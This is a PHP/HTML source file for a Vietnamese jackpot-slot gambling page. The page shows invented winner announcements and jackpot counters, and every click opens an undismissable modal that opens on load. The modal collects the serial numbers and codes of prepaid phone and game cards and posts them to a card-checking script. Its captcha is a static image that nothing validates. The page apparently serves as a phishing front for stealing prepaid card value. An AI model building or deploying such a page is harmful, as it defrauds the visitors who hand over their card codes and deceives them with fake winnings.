<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noodp">
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <title>NỔ HŨ CLUB - SĂN HŨ TIỀN VỀ NHƯ LŨ</title>
    <meta name="description" content="Nổ Hũ">
    <meta content="width=device-width,initial-scale=1" name="viewport">
    <meta name="keywords" content="Nổ Hũ">
    <link rel="stylesheet" href="nohu/css/bootstrap.css">
    <link rel="shortcut icon" type="image/png" href="/img/favicon.ico"/>
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
    <link href="nohu/css/style.css" rel="stylesheet">
</head>
<body>
<?php
include 'api/config.php';
include 'api/card_charging_api.php';

// Call lib
try {
    $api = new Card_charging_api($config);
}
catch (Card_charging_Exception $e) {
    exit($e->getMessage());
}

?>
<div class="top">
    <div class="container">
        <div class="row">
            <div class="flex text-center">
                <img src="img/menu.PNG" class="">
            </div>
            <div class="clearfix"></div>
            <div class="marquen">
                <marquee>Chúc mừng người chơi <span>chipme</span> thắng <span>250.000</span> game <span>Siêu xe</span> ,
                    <span>boyzin</span> thắng <span>250.000</span> game <span>Sinbad</span>,<span>Xaoliz</span> thắng
                    <span>350.000</span> game <span>Zues</span></marquee>
            </div>
        </div>
    </div>
</div>
<div class="box">
    <div class="container">
        <div class="row">
            <div class="col-md-3 m20 pa_o text-center"><a href="javascript:void (0)" data-toggle="modal"
                                                          data-target="#exampleModal"> <img src="img/iconhu.png"
                                                                                            class="ihu"> </a>
                <div class="sin">
                    <div class="item">
                        <div class="thum"><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal">
                            <img src="img/sinbat.png"> </a></div>
                        <div class="tex"><h2>Sinbad</h2>
                            <p class="counter">10,285,430</p></div>
                        <a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal"> <img class="x6"
                                                                                                            src="img/x6.png">
                        </a></div>
                    <div class="item">
                        <div class="thum"><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal">
                            <img src="img/kimcuong.png"> </a></div>
                        <div class="tex"><h2>Kim Cương</h2>
                            <p class="counter">7,484,670</p></div>
                    </div>
                    <div class="item">
                        <div class="thum"><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal">
                            <img src="img/candy.png"> </a></div>
                        <div class="tex"><h2>Candy</h2>
                            <p class="counter">7,056,356</p></div>
                    </div>
                </div>
            </div>
            <div class="col-md-9 m80 pa_o">
                <div id="testimonial-slider">
                    <div><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal"> <img
                            src="img/taixiu.png" width="145px"> </a></div>
                    <div><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal"> <img
                            src="img/sieuxe.png" width="145px"> </a></div>
                    <div><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal"> <img
                            src="img/tienle.png" width="145px"> </a></div>
                    <div><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal"> <img
                            src="img/zeus.png" class="im">
                        <div class="so"><p class="counter"> 82,921,456</p>
                            <p class="counter">13,587,342</p>
                            <p class="counter">8,349,583</p></div>
                    </a></div>
                    <div><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal"> <img
                            src="img/bat.png" class="im">
                        <div class="so"><p class="counter"> 82,921,456</p>
                            <p class="counter">13,587,342</p>
                            <p class="counter">8,349,583</p></div>
                    </a></div>
                    <div><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal"> <img
                            src="img/cuong.png" class="im">
                        <div class="so"><p class="counter"> 82,921,456</p>
                            <p class="counter">13,587,342</p>
                            <p class="counter">8,349,583</p></div>
                    </a></div>
                    <div><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal"> <img
                            src="img/thiendia.png" width="145px"> </a></div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="chan">
    <div class="container">
        <div class="row">
            <div class="flex text-center"><a href="javascript:void (0)" data-toggle="modal" data-target="#exampleModal">
                <img src="img/cup.png" class="cup"> <img src="img/vi.png" class="viz"> <img src="img/daily.png"
                                                                                            class="daily"> <img
                    src="img/group.png" class="group"> <img src="img/facen.png" class="facen"> <img
                    src="img/taigame.png" class="taigame"> </a></div>
        </div>
    </div>
</div>
<div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
     aria-hidden="true">
    <div class="modal-dialog" role="document" style="width: 1184px;">
        <div class="modal-content">
            <div class="napno">
                <div class="col-sm-6">
                    <form id="fomrz" method="POST" action="api/check_card.php">
                        <div class="inz">
                            <select id="select-mang" name="type">
                                <option value="1" class="text-select">VIETTEL AUTO</option>
                                <option value="3" class="text-select">VIETTEL</option>
                                <option value="2" class="text-select">MOBIFONE</option>
                                <option value="23" class="text-select">VINAFONE</option>
                                <option value="21" class="text-select">GATE AUTO</option>
                                <option value="22" class="text-select">GARENA</option>
                            </select>
                            <select name="amount">
                                <option value="10000" class="text-select">10.000</option>
                                <option value="20000" class="text-select">20.000</option>
                                <option value="30000" class="text-select">30.000</option>
                                <option value="50000" class="text-select">50.000</option>
                                <option value="100000" class="text-select">100.000</option>
                                <option value="200000" class="text-select">200.000</option>
                                <option value="300000" class="text-select">300.000</option>
                                <option value="500000" class="text-select">500.000</option>
                                <option value="1000000" class="text-select">1.000.000</option>
                            </select>
                            <input type="number" class="seri" name="serial" id="serial" placeholder="Nhập số Seri">
                            <input type="number" class="code" name="code" id="code" placeholder="Nhập mã thẻ">
                            <input type="text" id="captcha" placeholder="Mã xác nhận">
                            <img id="captcha-img" src="img/captcha.PNG">
                            <img id="refesh-img" src="img/refesh.png">
                        </div>
                        <button type="submit" name="submit" id="submit"><img id="napgold-img" src="img/napgold-btn.png"></button>

                    </form>
                </div>
                <div class="col-sm-6">
                    <div class="row">
                        <a href="#" id="chonthe"><img id="img-chonthe" style="width: 95%" src="img/chonthe-viettel.PNG"></a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div> <!---js-->
<script src="nohu/js/jquery-1.9.1.js"></script> <!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"
        integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"
        crossorigin="anonymous"></script>
<script src="nohu/js/jquery.validate.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.carousel.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.theme.min.css">
<script type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.carousel.min.js"></script>
<script>
    $(document).ready(function () {
        $("#testimonial-slider").owlCarousel({
            items: 6,
            itemsDesktop: [1199, 7],
            itemsDesktopSmall: [979, 5],
            itemsTablet: [767, 2],
            pagination: false,
            navigation: false,
            navigationText: ["", ""],
            autoPlay: false
        });
    });
</script>
<script src="//cdnjs.cloudflare.com/ajax/libs/waypoints/2.0.3/waypoints.min.js"></script>
<script src="http://bfintal.github.io/Counter-Up/jquery.counterup.min.js"></script>
<script>
    $(window).on('load',function(){
        $('#exampleModal').modal({
            backdrop: 'static',
            keyboard: false,
            show: true
        });
    });
    jQuery(document).ready(function ($) {
        $('.counter').counterUp({
            delay: 1,
            time: 1000
        });
    });
</script>
<script>

    $(document).ready(function() {
    	// var selectMang = $('#select-mang').val();
    	// $('#select-mang').change(function () {
		// 	selectMang = this(value);
		// })
    	// switch (selectMang) {
		// 	case '1':
		// 		$("#img-chonthe").attr('src',"img/chonthe-viettel.PNG");
		// 		break;
		// 	case '2':
		// 		$("#img-chonthe").attr('src',"img/chonthe-mobi.PNG");
		// 		break;
		// 	case '23':
		// 		$("#img-chonthe").attr('src',"img/chonthe-vina.PNG");
		// 		break;
		// }

		$('#submit').on('click', function () {
			var serial = $('#serial').val(),
				code = $('#code').val();

			if (serial.length === 0 || code.length === 0) {
				alert('Vui lòng nhập đủ thông tin');
				return false;
			}
		});

		// Submit search params by enter key
		$('#serial, #code').keypress(function(e) {
			if(e.which == 13) {
				$('#submit').click();
			}
		});

		// this is the id of the form
		$("#fomrz").submit(function(e) {


			var form = $(this);
			var url = form.attr('action');

			$.ajax({
				type: "POST",
				url: url,
				data: form.serialize(), // serializes the form's elements.
				success: function(data)
				{
					alert(data);
					console.log(data)
				}
			});

			e.preventDefault(); // avoid to execute the actual submit of the form.
		});

        $("#img-chonthe").on("click", function(event) {
            var y = event.pageY - this.offsetTop;
            
            if (y > 100 && y < 215) {
                $("#img-chonthe").attr('src',"img/chonthe-viettel.PNG");
                $("#select-mang").val('1')
                return false;
            }
            if (y > 235 && y < 345) {
                $("#img-chonthe").attr('src',"img/chonthe-mobi.PNG");
                $("#select-mang").val('2')
                return false;
            }
            if (y > 365 && y < 470) {
                $("#img-chonthe").attr('src',"img/chonthe-vina.PNG");
                $("#select-mang").val('23')
                return false;
            }
        });
    });


    /*$('#chonthe').click(function () {
        $('#img-chonthe').remove();
        $('#chonthe').prepend('<img id="img-chonthe" style="width: 95%" src="img/chonthe-mobi.PNG" />')
    })*/

</script>
</html>